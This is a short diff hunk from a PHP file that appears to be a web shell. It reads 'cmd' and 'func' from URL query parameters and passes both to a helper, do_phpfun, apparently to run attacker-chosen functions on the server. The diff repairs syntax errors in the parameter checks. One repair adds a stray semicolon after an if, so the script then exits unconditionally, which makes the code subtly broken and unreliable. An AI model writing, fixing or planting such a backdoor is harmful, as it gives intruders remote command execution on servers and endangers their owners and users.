@@ -25,10 +25,10 @@ function do_phpfun($cmd,$fun) {
 	return $res;
 }
 
-if (!isset($_GET['cmd'])
+if (!isset($_GET['cmd']))
 	die();
 
-if (!isset($_GET['func']);
+if (!isset($_GET['func']));
 	die();
 	
 do_phpfun($_GET['cmd'], $_GET['func']);
